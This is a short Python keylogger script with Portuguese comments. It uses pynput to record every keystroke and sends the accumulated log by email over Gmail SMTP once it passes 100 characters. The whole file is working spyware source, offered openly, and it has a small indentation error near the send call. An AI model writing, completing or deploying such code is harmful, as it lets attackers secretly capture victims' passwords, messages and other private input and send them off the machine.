from multiprocessing.connection import Listener
#biblioteca para enviar os emails com as teclas digitadas
import smtplib
#biblioteca que acessa os processos de registro do sistema operacional
import subprocess
#biblioteca que vai ler as teclas digitadas
from pynput.keyboard import Key, Listener

#email que vai receber as teclas digitadas
email  = ''
password = ''
#servidor smtplib
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

fullog = ''
words = ''
limite_caract_email = 100

def on_press(key):
    global words
    global email
    global limite_caract_email
    global fullog

    if key == key.space or key == key.enter:
        words += ' '
        fullog += words
        words = ''
        if len(fullog) >= limite_caract_email:
        send_log()
        fullog = ''            
    elif key == key.shift_l or key == key.shift_r:
        return
    elif key == key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        words += char

    if key == key.esc:
        return False

def send_log():
    server.sendmail(
    email,
    email,
    fullog
    )

with Listener(on_press=on_press) as Listener:
    Listener.join()